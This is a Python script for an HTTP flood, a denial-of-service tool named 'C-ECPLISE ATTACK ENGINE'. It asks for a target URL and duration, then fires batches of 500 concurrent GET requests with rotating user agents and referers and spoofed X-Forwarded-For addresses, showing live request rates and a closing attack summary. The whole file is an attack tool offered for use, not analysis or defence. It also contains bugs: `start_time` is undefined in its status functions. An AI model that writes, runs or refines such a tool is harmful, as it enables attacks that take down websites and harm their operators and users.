import asyncio
import aiohttp
import random
import sys
from datetime import datetime

# Configuration
MAX_CONCURRENT = 500  # Simultaneous connections
REQUEST_TIMEOUT = 10  # Seconds per request
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1"
]
REFERERS = [
    "https://www.google.com/",
    "https://www.facebook.com/",
    "https://www.youtube.com/"
]

class AttackEngine:
    def __init__(self):
        self.method = "C-ECPLISE"
        self.target = ""
        self.time = 0
        self.stats = {
            'total': 0,
            'success': 0,
            'errors': 0,
            'rps': 0,
            'peak_rps': 0
        }

    async def make_request(self, session):
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Referer": random.choice(REFERERS),
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        }
        
        try:
            async with session.get(self.target, headers=headers, timeout=REQUEST_TIMEOUT) as response:
                if response.status == 200:
                    return "SUCCESS"
                elif str(response.status).startswith('4'):
                    return "ERROR"
                return "OTHER"
        except:
            return "ERROR"

    async def run_attack(self):
        start_time = time.time()
        end_time = start_time + self.time
        
        async with aiohttp.ClientSession() as session:
            while time.time() < end_time:
                tasks = [self.make_request(session) for _ in range(MAX_CONCURRENT)]
                results = await asyncio.gather(*tasks)
                
                # Update stats
                self.stats['total'] += len(results)
                self.stats['success'] += results.count("SUCCESS")
                self.stats['errors'] += results.count("ERROR")
                
                # Calculate RPS
                elapsed = time.time() - start_time
                current_rps = self.stats['total'] / elapsed if elapsed > 0 else 0
                self.stats['rps'] = current_rps
                self.stats['peak_rps'] = max(self.stats['peak_rps'], current_rps)
                
                # Update console
                self.print_status()
                await asyncio.sleep(0.1)
        
        self.print_summary()

    def print_status(self):
        elapsed = time.time() - start_time
        remaining = max(0, self.time - elapsed)
        
        sys.stdout.write("\033[H\033[J")  # Clear console
        print(f"\nMETHOD: {self.method} | TARGET: {self.target} | TIME: {self.time}s")
        print("="*60)
        print(f" REQUESTS: {self.stats['total']} | SUCCESS: {self.stats['success']} | ERRORS: {self.stats['errors']}")
        print(f" RPS: {self.stats['rps']:.1f} | PEAK RPS: {self.stats['peak_rps']:.1f}")
        print(f" TIME REMAINING: {remaining:.1f}s")
        print("="*60)

    def print_summary(self):
        total_time = time.time() - start_time
        avg_rps = self.stats['total'] / total_time if total_time > 0 else 0
        
        print("\nATTACK COMPLETED")
        print("="*60)
        print(f" TARGET: {self.target}")
        print(f" DURATION: {total_time:.1f}s")
        print(f" TOTAL REQUESTS: {self.stats['total']}")
        print(f" SUCCESS (200): {self.stats['success']}")
        print(f" ERRORS (4xx): {self.stats['errors']}")
        print(f" AVERAGE RPS: {avg_rps:.1f}")
        print("="*60)

def main():
    engine = AttackEngine()
    
    print("\nC-ECPLISE ATTACK ENGINE")
    print("="*40)
    engine.method = input("METHOD: ").strip() or "C-ECPLISE"
    engine.target = input("TARGET: ").strip()
    engine.time = int(input("TIME (seconds): ").strip())
    
    if not engine.target.startswith(('http://', 'https://')):
        engine.target = f"http://{engine.target}"
    
    try:
        asyncio.run(engine.run_attack())
    except KeyboardInterrupt:
        print("\nAttack stopped by user")
    except Exception as e:
        print(f"\nError: {str(e)}")

if __name__ == "__main__":
    import time
    main()
